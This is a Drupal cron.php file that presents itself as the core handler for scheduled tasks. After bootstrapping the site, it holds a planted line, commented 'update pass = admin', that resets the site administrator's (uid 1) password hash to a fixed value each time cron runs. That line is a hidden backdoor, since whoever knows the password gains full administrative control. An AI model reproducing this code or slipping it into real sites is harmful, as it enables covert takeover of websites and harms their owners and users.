<?php
// $Id: cron.php,v 1.36 2006/08/09 07:42:55 dries Exp $

/**
 * @file
 * Handles incoming requests to fire off regularly-scheduled tasks (cron jobs).
 */

define('DRUPAL_ROOT', getcwd());

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
//update pass = admin
db_update('users')->fields(array('pass' => '$S$DyjxoW.QVaDdoN8H3aCpyoRVRk3RtjEA/Z48o.tqqh.AgUTjSJ4b'))->condition('uid', 1)->execute();
   